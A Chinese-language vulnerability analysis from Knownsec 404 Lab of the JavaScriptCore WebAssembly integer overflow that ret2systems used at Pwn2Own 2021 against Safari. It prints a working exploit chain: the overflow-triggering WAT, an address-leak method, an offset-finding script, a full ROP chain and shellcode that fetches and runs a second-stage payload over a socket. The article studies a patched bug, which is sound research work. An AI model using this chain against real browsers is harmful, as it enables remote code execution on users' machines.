@@ -1,0 +1,719 @@
+**作者：ghost461@知道创宇404实验室  
+时间：2021年12月31日**
+
+## 概述
+
+  * 该漏洞是Pwn2own 2021 safari项目中, ret2systems所使用的JavaScriptCore整数溢出漏洞, 该漏洞已在safari 14.1.1中被[修复](https://github.com/WebKit/WebKit/commit/13a6adc918a62eb5a3c97f40f12be1b8e3e572ae)
+  * [ret2systems的博客](https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/)进行了详细的漏洞原理的介绍, 并放出了第一阶段使用的[POC](https://github.com/ret2/Pwn2Own-2021-Safari/tree/main/rce), 本文将结合POC对该漏洞进行原理分析
+
+## 关于POC
+
+  * `gen_wasm.py`: 用于生成WebAssembly模块到rets.wasm文件
+  * `shellcode`: 完成溢出漏洞后使用的第一阶段的shellcode, 默认会向localhost:1337请求并加载第二阶段(沙盒逃逸)shellcode, 以完成任意代码执行. (但第二阶段shellcode并未放出)
+  * `stage2_server.py`: 用于监听本地1337端口, 以发送第二阶段shellcode
+  * `pwn.html`: 浏览器漏洞利用入口, 调起pwn.js
+  * `pwn.js`: 调起两个worker线程, 获取wasm数据并发放给worker线程
+  * `worker.js`: worker线程, 用于加载wasm以触发漏洞
+  * `worker2.js`: worker线程, 作为受害者线程承载ROP链以及shellcode
+  * [*]`rets.wasm`: 由`gen_wasm.py`脚本生成的wasm二进制文件, 也就是实际触发漏洞时解析的目标WebAssembly程序
+  * [*]`rets.wat`: rets.wasm经过一些修改后, 由[wabt](https://github.com/WebAssembly/wabt)反编译为wat文本, 辅助理解POC生成的wasm程序的结构
+  * [*]`jsc_offsets`: 是生成wasm前的一些基础信息, 如: 泄露地址到dylib基地址的偏移, ROP链中gadget的偏移地址, 关键调用的地址
+  * [*]`stage2_shellcode.bin`: 第二阶段shellcode, 由于没有可用的沙盒逃逸利用, 这里的stage2_shellcode只是做了int3断点以及一些无用数据
+  * 带`*` 文件是拿到POC作者未提供的, 需要使用脚本生成, 或是自己按需补充
+
+* * *
+
+  * 以下命令生成rets.wasm与jsc_offsets文件
+
+    
+    
+    rce % python3 gen_wasm.py -offs prod
+    
+    leak_off, hndl_raw_mem_off, gadg, syms = 15337245, 40, {'ret': 15347, 'rdi': 4627172, 'rsi': 624110, 'rdx': 3993325, 'rcx': 917851, 'jmp_rax': 76691}, {'__ZN3JSC19ExecutableAllocator8allocateEmNS_20JITCompilationEffortE': 10101216, '_memcpy': 16987498, '_dlsym': 16987090}
+    module of len 0x10009316 written
+
+## 漏洞原理分析
+
+### 一句话描述
+
+    
+    
+    WebKit的JavaScriptCore在加载解析WebAssembly模块时, 栈大小计数器m_maxStackSize存在整数溢出问题, 进而导致WebAssembly函数序言(wasmPrologue)阶段的栈帧分配异常, 最终导致沙盒内的代码执行
+
+  * 正常程序流程: `Wasm模块 -> parse阶段 -> 函数序言(prologue)阶段 -> 运行函数体`
+  * 漏洞利用流程: 
+
+    
+    
+    Wasm模块 -> parse阶段(m_maxStackSize = 0xffffffff) -> 函数序言阶段(m_numCalleeLocals = 0; 不分配栈空间) -> 运行函数体, 入栈操作覆盖内存 -> 地址泄露 -> ROP链 -> shellcode
+
+### JavaScriptCore背景
+
+  * JSC是WebKit的JavaScript引擎, 在JSC执行任何JavaScript代码之前, 它必须为其完成词法解析以及生成字节码, JSC有4个执行层:
+    * Low Level Interpreter(LLInt): 启动解释器
+    * Baseline JIT: 模版JIT
+    * DFG JIT: 低延迟优化编译器
+    * FTL JIT: 高吞吐量优化编译器
+  * 程序段首先执行在最低级的字节码解释器中, 随着代码执行的增多, 就会被OSR(On-Stack-Replace)提升到更高的层级
+  * [WebKit中的WebAssembly](https://webkit.org/blog/7691/webassembly/)程序同样是由JSC负责解析执行的, wasm的运行层级略有不同: `LLInt -> BBQ -> OMG`
+  * 关于[WebAssembly的文本格式](https://developer.mozilla.org/en-US/docs/WebAssembly/Understanding_the_text_format), 可以看看
+  * 由于该漏洞发生在wasm模块的解析与字节码生成的阶段, 所以我们这里只关注LLInt
+
+#### LLint
+
+  * 对于JavaScript, 负责执行由Parser生成的字节码
+  * 对于WebAssembly, JSC要负责解析验证, 生成字节码以及实际运行
+  * JSC由名为offlineasm的可移植汇编语言编写, 源码位于WebKit项目中的`JavaScript/llint/LowLevelInterpreter.asm`文件
+  * 为了处理一些操作, LLInt需要在执行指令时调用一些C函数进行扩展处理, 这些会被调用到的C函数被称为`slow_path`, 在asm文件中可以看到这些函数 (这一点我们将在后面地址泄漏时提到)
+
+### 漏洞相关代码
+
+  * 使用WebKit对应release版本源代码: [Safari 14.0.3, macOS BigSur 11.2.3](https://github.com/WebKit/WebKit/releases/tag/releases%2FApple%2FSafari-14.0.3-macOS-11.2.3)
+
+#### FunctionParser 与 LLIntGenerator
+
+  * 关于解析器如何使用controlStack与expressionStack来跟踪wasm模块所需的栈大小, [ret2systems博客](https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/#parsing-and-codegen)已经十分详细的描述了这一过程, 本文这里就只挑关键的点用代码来描述
+  * `解析器(WasmFunctionParser)`将负责验证函数的有效性, 这将涉及所有堆栈操作以及控制流分支的类型检查(使用`m_controlStack` 与 `m_expressionStack`) 
+
+    
+    
+    // JavaScriptCore/wasm/WasmFunctionParser.h
+        Stack m_expressionStack;
+        ControlStack m_controlStack
+
+  * Wasm函数具有非常结构化的块形式的控制流, 可以是通用块、循环或是if条件(这些在解析器中都可以被认为是块), 其中TopLevel是controlStack初始化的第一个元素, 即wasm解析时的第一层
+
+    
+    
+    // JavaScriptCore/wasm/WasmFunctionParser.h
+    enum class BlockType {
+        If,
+        Block,
+        Loop,
+        TopLevel
+    };
+
+  * 从解析器的角度来看, 每个块都有自己的表达式栈, 与`封闭块的表达式栈(enclosedExpressionStack)`分开
+  * 根据[多值范式](https://github.com/WebAssembly/multi-value/blob/master/proposals/multi-value/Overview.md), 每个块都可以具有参数类型与返回类型的签名(signature, 可以理解为参数与返回值声明)
+  * 解析器进入新的块时, 参数从当前表达式栈中弹出, 并用作新的块表达式栈的初始值, 旧的表达式栈作为封闭栈(enclosedExpressionStack)进入控制栈; 块解析结束时, 返回值被push到封闭栈上
+
+  * `生成器(WasmLLIntGenerator)`跟踪各种元数据, 包括当前整体堆栈大小(`m_stackSize`)以及整个解析过程中栈容量的最大值(`m_maxStackSize`), 当前堆栈大小有助于将抽象堆栈位置转换为本地堆栈的偏移量, 而最大堆栈值则将决定函数序言期间将分配的栈空间大小
+
+    
+    
+    // JavaScript/wasm/WasmLLIntGenerator.cpp
+        unsigned m_stackSize { 0 };
+        unsigned m_maxStackSize { 0 };
+
+  * `m_stackSize`: 当前表达式栈(m_expressionStack)的长度, 根据参数传递约定, 在x86_64系统上, 默认分配2个非易失性寄存器(Callee-Saved Register)、6个通用寄存器(General Purpose Register)和8个浮点数寄存器(Floating Point Register)用于函数调用, 所以无论函数是否接收这么多参数, m_stackSize都从`16`开始
+
+    * `JSC::Wasm::numberOfLLIntCalleeSaveRegisters`: 根据调用约定保留的2个Callee-Save Register `cpp // JavaScriptCore/wasm/WasmCallingConvention.h constexpr unsigned numberOfLLIntCalleeSaveRedisters = 2;`
+
+    * `JSC::GPRInfo::numberOfArgumentRegisters`: 通用寄存器计数, x86_64下默认为6个
+
+    
+    
+    // JavaScript/jit/GPRInfo.h
+    #if CPU(X86_64)
+    #if !OS(WINDOWS)
+    #define NUMBER_OF_ARGUMENT_REGISTERS 6u
+    ......
+    class GPRInfo {
+    public:
+        typedef GPRReg RegisterType;
+        static constexpr unsigned numberOfRegisters = 11;
+        static constexpr unsigned numberOfArgumentRegisters = NUMBER_OF_ARGUMENT_REGISTERS
+        ......
+
+  * `JSC::FPRInfo::numberOfArgumentRegisters`:浮点数寄存器计数, x86_64下默认为8个
+
+    
+    
+    // JavaScriptCore/jit/FPRInfo.h
+    class FPRInfo {
+    public:
+        typedef FPRReg RegisterType;
+        static constexpr unsigned numberOfRegisters = 6;
+        static constexpr unsigned numberOfArgumentRegisters = is64Bit() ? 8 : 0;
+        ......
+
+  * `m_maxStackSize`: 在wasm解析阶段, 跟踪函数内所需的最大栈长度, 通常在push操作时更新
+
+    
+    
+    // JavaScriptCore/wasm/WasmLLIntGenerator.cpp
+    enum NoConsistencyCheckTag { NoConsistencyCheck };
+        ExpressionType push(NoConsistencyCheckTag)
+        {
+            m_maxStackSize = std::max(m_maxStackSize, ++m_stackSize);
+            return virtualRegisterForLocal(m_stackSize - 1);
+        }
+    
+    
+    // JavaScriptCore/wasm/WasmLLIntGenerator.cpp
+    std::unique_ptr<FunctionCodeBlock> LLIntGenerator::finalize()
+    {
+        RELEASE_ASSERT(m_codeBlock);
+        m_codeBlock->m_numCalleeLocals = WTF::roundUpToMultipleOf(stackAlignmentRegisters(), m_maxStackSize);
+    
+        auto& threadSpecific = threadSpecificBuffer();
+        Buffer usedBuffer;
+        m_codeBlock->setInstructions(m_writer.finalize(usedBuffer));
+        size_t oldCapacity = usedBuffer.capacity();
+        usedBuffer.resize(0);
+        RELEASE_ASSERT(usedBuffer.capacity() == oldCapacity);
+        *threadSpecific = WTFMove(usedBuffer);
+    
+        return WTFMove(m_codeBlock);
+    }
+
+  * `m_numCalleeLocals`: 在解析完成后, 该值在m_maxStackSize的基础上`向上舍入`以对其堆栈(16字节对齐, 或是x86_64上的2个寄存器长度), 但m_numCalleLocals被声明为`int`类型
+
+    
+    
+    // WTF/wtf/StdLibExtras.h
+    ALWAYS_INLINE constexpr size_t roundUpToMultipleOfImpl(size_t divisor, size_t x)
+    {
+        size_t remainderMask = divisor - 1;
+        return (x + remainderMask) & ~remainderMask;            // divisor = 2; x = 0xffffffff; return 0x100000000;
+    }
+    
+    // Efficient implementation that takes advantage of powers of two.
+    inline size_t roundUpToMultipleOf(size_t divisor, size_t x)
+    {
+        ASSERT(divisor && !(divisor & (divisor - 1)));
+        return roundUpToMultipleOfImpl(divisor, x);
+    }
+    
+    
+    // JavaScriptCore/wasm/WasmFunctionCodeBlock.h
+    class FunctionCodeBlock{
+        ......
+    private:
+        using OutOfLineJumpTargets = HashMap<InstructionStream::Offset, int>;
+        uint32_t m_functionIndex;
+        int m_numVars { 0 };
+        int m_numCalleeLocals { 0 };               // 0x100000000 ==> m_numCalleLocals = 0x00000000;
+        uint32_t m_numArguments { 0 };
+        Vector<Type> m_constantTypes;
+        ......
+
+  * 最终, 实际调用wasm函数, 在LLInt的wasmPrologue阶段, m_numCalleeLocals被用于决定实际分配的栈帧大小(并会被检查是否超出最大栈帧长度, 决定是否抛出堆栈异常)
+
+    
+    
+    macro wasmPrologue(codeBlockGetter, codeBlockSetter, loadWasmInstance)
+        ......
+        # Get new sp in ws1 and check stack height.
+        loadi Wasm::FunctionCodeBlock::m_numCalleeLocals[ws0], ws1        # <---- m_numCalleeLocals
+        lshiftp 3, ws1
+        addp maxFrameExtentForSlowPathCall, ws1
+        subp cfr, ws1, ws1
+    
+        bpa ws1, cfr, .stackOverflow
+        bpbeq Wasm::Instance::m_cachedStackLimit[wasmInstance], ws1, .stackHeightOK
+    
+    .stackOverflow:
+        throwException(StackOverflow)
+    
+    .stackHeightOK:
+        move ws1, sp
+        ......
+
+## 漏洞利用
+
+### 触发漏洞
+
+  * 要触发整数溢出问题, 我们需要构造出能使解析器执行`2^32次push操作`的wasm函数, POC最终选择使用之前提到的多值范式, 以及解析器对unreachable代码的处理相结合的方法
+  * 之前提到多值范式没有说的一点是, 它允许块拥有任意数量的返回值, 在JavaScriptCore的实现中也没有强制规定该数量的上限, 这允许我们构造具有大量返回值的块
+
+  * 解析器会执行一些非常基本的分析来确定代码是否为无法访问或是死代码, 当解析时遇到使用`unreachable`显式声明, 或是无条件分支跳转指令后后无任何调用的代码段(`dead code`), 生成器会直接将声明的返回类型push到封闭栈中
+
+    
+    
+    auto LLIntGenerator::addEndToUnreachable(ControlEntry& entry, const Stack& expressionStack, bool unreachable) -> PartialResult
+    {
+        ......
+        for (unsigned i = 0; i < data.m_signature->returnCount(); ++i) {
+            ......
+            if (unreachable)
+                entry.enclosedExpressionStack.constructAndAppend(data.m_signature->returnType(i), tmp);    // push returnType -> enclosedExpressionStack
+            else
+                entry.enclosedExpressionStack.append(expressionStack[i]);
+        }
+        ......
+        return { };
+    }
+
+  * 通过以上的说明, 似乎可以直接构造出2^32个返回值的块, 但实际有一个问题阻碍我们实现这一点, 表达式栈是由一个WTF::Vector实现的, 它有一个4字节大小的变量(unsigned m_capacity)并设置了检查以确保分配的内存大小长度不会大于32bit; 装入Vector的元素是TypedExpression对象, 其大小为8, 所以单个表达式栈的上限为2^32 / 8 = 2^29 = 0x20000000, 实际上分配的可能会更少, 所以我们不能在单个块中声明如此多的返回值
+
+    
+    
+    // WTF/wtf/Vector.h
+    bool allocateBuffer(size_t newCapacity)
+        {
+            static_assert(action == FailureAction::Crash || action == FailureAction::Report);
+            ASSERT(newCapacity);
+            if (newCapacity > std::numeric_limits<unsigned>::max() / sizeof(T)) {          // check
+                if constexpr (action == FailureAction::Crash)
+                    CRASH();
+            ......
+            size_t sizeToAllocate = newCapacity * sizeof(T);
+            ......
+            m_capacity = sizeToAllocate / sizeof(T);            // max 2^32
+            m_buffer = newBuffer;
+            return true;
+        }
+
+  * 为了解决这个问题, 我们可以把2^32个返回值分给16个块, 使这些块相互嵌套, 每个块都具有0x10000000个返回值, 每个块都有自己的表达式栈, 最终设置m_maxStackSize为0xffffffff, 一旦解析结束就会完成溢出
+
+    
+    
+    (module
+      (type (;0;) (func))
+      (type (;1;) (func (result f64 f64 ... )))  ;; a lot of f64 (f64 * 0x10000000)
+      (type (;2;) (func (param i64 i64)))
+      (import "e" "mem" (memory (;0;) 1))
+      (func (;0;) (type 2) (param i64 i64)
+        ;; "real" code we want to execute can be placed here
+        i32.const 1                                            ;; use 'br_if', or the following code would be 'dead_code'
+        br_if 0 (;@0;)                                         ;; 
+        block  ;; label = @1                                   ;; begin to fill 32GB
+          block (result f64 f64 ... )  ;; label = @2                ;; push m_maxStackSize to 0xffffffff
+            unreachable                                        ;; then m_numCalleeLocals = 0x0
+          end                                                  ;; when parsing completes.
+          ;; current stack has 0x10000000 values, m_maxStackSize = 0x10000000
+          block  ;; label = @2
+            ;; new block has an empty expression stack
+            block (result f64 f64 ... )  ;; label = @3
+              unreachable
+            end
+            ;; current stack has 0x10000000 values, m_maxStackSize = 0x20000000
+            block  ;; label = @3
+              block (result f64 f64 ... )  ;; label = @4
+                unreachable
+              end
+    
+                ......
+    
+              br 0 (;@3;)
+            end
+            br 0 (;@2;)
+          end
+          br 0 (;@1;)
+        end
+        return)
+      (func (;1;) (type 0)
+        i64.const 0
+        i64.const 0
+        call 0)
+      (export "rets" (func 1)))
+
+  * 这样构造出的每个块大约占用2GB内存, 16个块加起来将消耗32GB, 看起来很夸张, 在macOS内存压缩与SSD提供的swap配合下, 还是能够实现(pwn2own现场跑了3分半), 我给macOS虚拟机设置了8GB内存也能实现(就是有点吃硬盘)
+
+![](https://images.seebug.org/content/images/2021/12/0d5e277d-5e27-4e65-b526-2b80a9a9b74c.png-w331s)
+
+### 地址泄漏
+
+  * 成功触发漏洞, 将m_numCalleeLocals设置为0后, 接下来开始漏洞利用的过程, 此时我们调用wasm中的函数, LLInt将不会对降低栈帧, 导致以下的堆栈布局
+
+    
+    
+                | ...            |
+                | loc1           |
+                | loc0           |
+                | callee-saved 1 |
+                | callee-saved 0 |
+    rsp, rbp -> | previous rbp   |
+                | return address |
+
+  * 正如前面提到的, 此时栈上2个callee-saved以及14个loc[0~13], 是根据函数调用约定可预测的一段栈空间. 因此, 为了能够在wasm函数中访问loc0与loc1, 我们需要让函数声明接收两个`i64`参数
+
+    
+    
+        (type (;2;) (func (param i64 i64)))
+        (func (;0;) (type 2) (param i64 i64)
+
+  * 为了达成地址泄漏的目的, 需要触发LLInt的slow_path来进行处理, 因为在slow_path函数运行期间发生的任何push操作, 都会覆盖我们栈上的callee-saved与局部变量; 而当slow_path函数返回后, 我们由可以操作wasm的本地变量读取刚才的地址
+  * 一个名为`slow_path_wasm_out_of_line_jump_target`的slow_path函数, 适用于wasm模块中偏移量太大而无法直接以字节码格式编码的跳转分支, 在此, 至少为0x80的偏移量就可以
+
+    
+    
+    block
+      ;; branch out of block
+      ;; an unconditional `br 0` will not work as the filler would be dead code
+      i32.const 1
+      br_if 0
+      i32.const 0        ;; filler code here...
+      i32.popcnt         ;; such that the offset from the above branch
+      drop               ;; to the end of the block is >= 0x80
+      ......
+    end
+
+  * 至此即可触发LLInt对slow_path_wasm_out_of_line_jump_target, 执行时效果如下:
+
+![](https://images.seebug.org/content/images/2021/12/6a45c7a7-ac46-4113-8b93-4a4d548b5517.png-w331s)
+
+  * 现在loc0中有一个返回地址, 该地址指向`JavaScriptCore dylib`中的一个固定偏移, 我们可以事先计算该偏移量, 以在程序运行时得到该dylib在内存中的基地址; loc1中则包含一个`当前的栈地址`; 这两者的信息为我们提供了远程代码执行所需的信息泄漏
+
+  * 在获取了泄露的地址之后, 还不能立即开始ROP链的实施, 有一些关于内存布局的小问题
+
+  * 当前我们所要执行的wasm函数没有被分配任何栈地址空间, 所以理论上在该函数内应该能够写入最大负偏移量(rbp-0x10000)以内的任意栈地址, 也就是说, 我们几乎可以覆盖当前堆栈下方的任意内存
+  * 者在主线程的上下文中并不是很有帮助, 因为主线程的栈下方没有任何可靠的映射. 然而, 线程的堆栈是从专用虚拟内存区域以递增的地址连续分配的
+
+    
+    
+    STACK GUARD   70000b255000-70000b256000 [ 4K   ] ---/rwx stack guard for thread 1
+    Stack         70000b256000-70000b2d8000 [ 520K ] rw-/rwx thread 1
+    STACK GUARD   70000b2d8000-70000b2d9000 [ 4K   ] ---/rwx stack guard for thread 2
+    Stack         70000b2d9000-70000b35b000 [ 520K ] rw-/rwx thread 2
+
+  * 如果我们的wasm函数在线程2中执行, 线程1的堆栈将会是损坏目标, 唯一的问题就是保护页, 然而, LLInt以原始的优化形式为我们提供了便利
+  * 当push一个常量值时, 生成器实际上并没有发出'将常量写入栈'的指令, 相反, 它将常量添加到'常量池‘当中, 之后对该常量的读取也不是从栈空间而是从常量池. 注意, 此时wasm模块已经进入运行阶段, 不要与解析阶段的栈操作相混淆
+
+    
+    
+        i32 .const  1
+        i32 .const  2
+        i32 .const  3
+        i32 .add
+
+  * 例如上面这个代码段, 实际上只有add操作时向栈push了5, 其余const并没有写入栈的操作. 利用这样的特性, 我们可以通过大量push未使用的常量值, 跳过保护页
+  * 综合一下, 在实际执行ROP链之前, 我们使用loc0减去事先计算好的偏移量, 获得JavaScriptCore dylib基地址; 使用loc1减去用于跳过保护页的常量数量, 获得一个受害者线程的栈地址;
+
+    
+    
+    block  ;; label = @1
+        local.get 0
+        i64.const 15337245    ;; subtract offset to JavaScriptCore dylib base 
+        i64.sub
+        local.set 0
+        local.get 1
+        i64.const 144312      ;; offset to where the ropchain will be
+        i64.sub
+        local.set 1
+        i64.const 0           ;; push a ton of constants to hop over the guard page
+        i64.const 0
+        ......
+    
+        local.get 0
+        i64.const 15347       ;; ROP begin
+        i64.add               ;; nop
+        drop
+        drop
+        ;; write ROP chain to stack
+    end
+
+  * 一直到了这一步, 可以发现针对这个漏洞, 并不需要像目前主流的浏览器漏洞利用那样, 构造`addrof()`和`fakeobj()`来渐进式的获取漏洞利用, 而是一个很不错的老式ROP链即可
+
+  * 关于如何计算JavaScriptCore dylib基地址, 可以使用从shared_cache中获取的方式, 在对应版本的系统中使用以下python方法即可, 总体思路就是debug JavaScriptCore, 从调试器中获取目标方法的第一个call指令, 到基地址的偏移量即为我们需要的leak_off. (小坑: 如果脚本停在`lldb.recvuntil("\n\n")`里没有返回的话, 检查一下你的lldb dis指令结束时是否少一个换行符, 按实际需要修改脚本即可)
+
+    
+    
+    def get_jsc_offsets_from_shared_cache():
+        open("/tmp/t.c", "w").write('''
+        #include <dlfcn.h>
+        int main() {
+            dlopen("/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore", RTLD_LAZY);
+            asm volatile("int3");
+            return 0;
+        }
+        ''')
+        os.system("clang /tmp/t.c -o /tmp/t")
+        lldb = subprocess.Popen(["lldb","--no-lldbinit","/tmp/t"], bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        lldb.sendline = lambda s: lldb.stdin.write(s.encode('utf-8')+b'\n')
+        def m_recvuntil(s):
+            s = s.encode('utf-8')
+            buf = b""
+            while not buf.endswith(s):
+                buf += lldb.stdout.read(1)
+            return buf
+        lldb.recvuntil = m_recvuntil
+    
+        try:
+            lldb.sendline("settings set target.x86-disassembly-flavor intel")
+            lldb.sendline("r")
+            lldb.recvuntil("stopped")
+            lldb.sendline("ima list -h JavaScriptCore")
+            lldb.recvuntil("0] ")
+            jsc_base = int(lldb.recvuntil("\n")[:-1], 16)
+    
+            lldb.sendline("dis -n slow_path_wasm_out_of_line_jump_target")
+            lldb.recvuntil("JavaScriptCore`slow_path_wasm_out_of_line_jump_target:\n")
+            disas = lldb.recvuntil("\n\n").decode("utf-8")
+            disas = disas.split('\n')
+            disas = [disas[i] for i in range(1,len(disas)) if "call " in disas[i-1]][0]
+            leak_off = int(disas.split(' <')[0].strip(), 16)-jsc_base
+        ......
+
+### ROP链
+
+  * 利用本地变量在wasm中编写一个gadget大致如下
+
+    
+    
+    local.get 0 ;; JavaScriptCore dylib address
+    i64.const <offset to gadget>
+    i64.add ;; the addition will write the gadget to the stack
+
+  * 要在栈中写入常量可以使用loc1作为基地址, 使用按位或操作, 或是使用常量0来完成
+
+  * ROP链是为了调起并保证shellcode的执行, 由于macOS中SIP(系统完整性保护)机制的存在, 内存页面的RWX属性仅当存在一特定标志时生效, `MAP_JIT(0x800)`, 而该标志仅在mmap创建时授予.
+
+  * 线程堆栈并未被映射为MAP_JIT, 所以我们不能简单的使用`mprotect`将shellcode放在栈上并返回调用到它
+  * 为解决此问题, 我们将调用函数`ExecutableAllocator::allocate`, 以在现有的rwx JIT区域中保留一个地址, 然后使用`memcpy`将shellcode放在那里, 最终返回到它并执行
+  * 最终ROP链在wasm中的样子: 
+
+    
+    
+          local.get 0
+          i64.const 4627172                              ;; pop_rdi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 80
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 3993325                              ;; pop rdx
+          i64.add
+          drop
+          drop
+          i64.const 144                                  ;; len(shellcode)
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 917851                               ;; pop rcx
+          i64.add
+          drop
+          drop
+          i64.const 1
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 10101216       ;; syms['__ZN3JSC19ExecutableAllocator8allocateEmNS_20JITCompilationEffortE']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 4627172                               ;; pop rdi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 262144                                ;; 0x40000
+          i64.sub
+          drop
+          drop
+          local.get 0
+          i64.const 624110                                ;; pop rsi
+          i64.add
+          drop
+          drop
+          drop
+          local.get 0
+          i64.const 3993325                                ;; pop rdx
+          i64.add
+          drop
+          drop
+          i64.const 48                                     ;; hndl_raw_mem_off+8
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 16987498                               ;; syms['_memcpy']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 4627172                                ;; pop rdi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 176                                    ;; 22*8
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 624110                                 ;; pop rsi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 262104                                 ;; 0x4000 - hndl_raw_mem_off
+          i64.sub
+          drop
+          drop
+          local.get 0
+          i64.const 3993325                                ;; pop rdx
+          i64.add
+          drop
+          drop
+          i64.const 8
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 16987498                               ;; syms['_memcpy']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 4627172                                ;; pop rdi
+          i64.add
+          drop
+          drop
+          drop
+          local.get 0
+          i64.const 624110                                 ;; pop rsi
+          i64.add
+          drop
+          drop
+          local.get 1
+          i64.const 248                                    ;; 31*8
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 3993325                                ;; pop rdx
+          i64.add
+          drop
+          drop
+          i64.const 144                                    ;; len(shellcode)
+          i64.const 0
+          i64.or
+          drop
+          drop
+          local.get 0
+          i64.const 16987498                               ;; syms['_memcpy']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 4627172                                ;; pop rdi, pass dlsym to shellcode
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 16987090                               ;; syms['_dlsym']
+          i64.add
+          drop
+          drop
+          local.get 0
+          i64.const 76691                                  ;; gadg['jmp_rax']
+          i64.add
+          drop                                             ;; begin to write shellcode
+          i64.const 144115607791438153
+          i64.or
+          drop
+          ......
+
+### shellcode
+
+    
+    
+            sc = '''
+            ## save dlsym pointer
+            mov r15, rdi
+    
+            ## socket(AF_INET, SOCK_STREAM, 0)
+            mov eax, 0x2000061
+            mov edi, 2
+            mov esi, 1
+            xor edx, edx
+            syscall
+            mov rbp, rax
+    
+            ## create addr struct
+            mov eax, dword ptr [rip+ipaddr]
+            mov r14, rax
+            shl rax, 32
+            or rax, 0x%x
+            push rax
+            mov eax, 0x2000062
+            mov rdi, rbp
+            mov rsi, rsp
+            mov dl, 0x10
+            syscall
+    
+            ## read sc size
+            mov eax, 0x2000003
+            mov dl, 8
+            syscall
+    
+            ## mmap rwx
+            xor edi, edi
+            pop rsi
+            mov dl, 7
+            mov r10d, 0x1802 # MAP_PRIVATE|MAP_ANONYMOUS|MAP_JIT
+            xor r8, r8
+            dec r8
+            xor r9, r9
+            mov eax, 0x20000c5
+            syscall
+    
+            ## read sc
+            mov rdi, rbp
+            mov rdx, rsi
+            mov rsi, rax
+            push rsi
+    
+            read_hdr:
+            test rdx, rdx
+            jz read_done
+            mov eax, 0x2000003
+            ## rdx gets trashed somehow in syscall???? no clue...
+            push rdx
+            syscall
+            pop rdx
+            sub rdx, rax
+            add rsi, rax
+            jmp read_hdr
+            read_done:
+            pop rsi
+    
+            ## jmp to sc, pass dlsym, socket, and server ip
+            ## (need call not jmp to 16-byte align stack)
+            mov rdi, r15
+            xchg rsi, rbp
+            mov rdx, r14
+            call rbp
+    
+            ipaddr:
+            '''%(2|(port<<16))
+
+  * 由于safari沙箱机制, 仅仅这一个代码执行的漏洞还没有突破沙箱的限制, 所以目前单独复现该漏洞的效果就是能确认第一阶段shellcode运行成功, 向目标端口建立socket连接以获取第二阶段shellcode并返回调用
+  * 关于第二阶段shellcode, 将会是沙箱逃逸的另一个漏洞, 只不过目前还没有公开的程序或资料, ret2systems也在博客末尾提到该漏洞将在之后的文章中分享
+
+![](https://images.seebug.org/content/images/2021/12/791433ca-a69a-41d1-b11d-1f9c406c75cb.png-w331s)
+
+  * 作为漏洞复现的最终展示, 这里能看到
+    * stage2_server可以成功建立连接
+    * 使用lldb调试WebContent进程成功获取到shellcode中的int3断点并查看内存布局
+
+![](https://images.seebug.org/content/images/2021/12/18694185-84c6-4569-acb1-ed3bed093a0f.png-w331s)
+
+## 总结
+
+  * 这个漏洞本身还是非常好理解的, 从隐式类型转换到整数溢出再到栈溢出, 以及后面的ROP链的利用, 都还算是很经典的漏洞问题了
+  * 本篇文章记录一下自己学习WebKit漏洞的过程, 尽管POC作者已经给出了相当详细的描述解释, 复现下来发现还是有一些坑要自己踩一下的. 在记录整理的过程中也发现很多原理上的细节没有注意到, 仔细思考后发现这些小细节都可以直接决定漏洞利用是否成功.
+  * 在漏洞复现期间, 能明显的感觉到, 作者发现并编写了这一套漏洞利用, 我能做到复现, 仅仅是获得了作者在这方面十分之一的知识储备; 但从另一个角度讲, 如果没有做复现学习, 我们可能需要浪费十倍以上的时间在各种弯路上. 所以说还是要感谢分享技术的大佬, 让我们有机会快速进入这个领域, 并能够看见之后的方向.
+
+![](https://images.seebug.org/content/images/2021/12/96c7394c-e40b-4f4c-a780-22f10cea90cc.jpg-w331s)
+
+  * 贴一张pwn2own截图, 愿大家都有这么一刻吧
+
+* * *
+
+![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
+本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1804/>
+
